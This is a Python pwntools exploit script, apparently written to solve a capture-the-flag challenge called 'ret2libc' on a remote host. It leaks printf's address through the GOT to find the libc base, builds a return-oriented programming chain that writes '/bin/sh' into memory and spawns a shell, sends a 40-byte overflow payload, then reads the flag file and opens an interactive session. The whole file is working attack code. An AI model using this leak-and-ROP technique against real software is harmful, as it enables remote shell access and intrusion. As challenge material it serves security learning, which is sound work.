from pwn import *

context.arch = 'amd64'
local = False

if local:
    elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    r = process('./ret2libc')
else:
    elf = ELF('./libc.so.6')
    r = remote('140.115.59.7', 11006)
printf_got = int('0x601028', 16)  # global offset from ./ret2libc

r.recvuntil('Give me the address in decimal:')
r.sendline(str(printf_got))
r.recvuntil('is 0x')

printf_str_addr = r.recv().split('.')[0]  # get the addr of printf in libc.so
printf_addr = int(printf_str_addr, 16)
printf_offset = elf.symbols['printf']
base_addr = printf_addr - printf_offset
system_offset = elf.symbols['system']  # from libc.so
system_addr = base_addr + system_offset

sh_heap = 0x00601500
mov_prax_rdx = 0x000000000002d9d2 + base_addr
pop_rdx = 0x0000000000001b92 + base_addr
pop_rax = 0x000000000003a718 + base_addr
pop_rdi = 0x0000000000021102 + base_addr
pop_rsi = 0x00000000000202e8 + base_addr

rop = flat([pop_rax, sh_heap, pop_rdx, "/bin/sh\x00", mov_prax_rdx, pop_rax, 0x3b, pop_rdi, sh_heap, pop_rsi, 0, pop_rdx, 0, system_addr])
payload = '\x00' * 40
r.sendline(payload + rop)
r.sendline('cat /home/ret2libc/flag')
r.interactive()
